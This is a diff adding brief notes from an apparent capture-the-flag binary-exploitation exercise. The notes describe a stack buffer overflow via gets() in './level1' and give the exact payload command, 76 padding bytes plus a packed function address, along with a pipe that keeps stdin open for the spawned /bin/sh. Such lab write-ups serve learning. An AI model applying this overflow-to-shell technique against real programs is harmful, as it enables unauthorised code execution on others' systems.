@@ -1,0 +1,7 @@
+decompile ./level1
+notice gets on stack buffer and run function which execve(/bin/sh)
+gets is unsafe because there is no size_max
+can override the IEP of main with the adress of function run
+adress of function run with either gdb or objump -d ./level1
+have to let stdin open for the bahs opened with either cat - or (cat /tmp/payload; cat ) | ./level1
+python -c 'import struct; print "A" * 76 + struct.pack("<I", 0x08048444)' > /tmp/payload
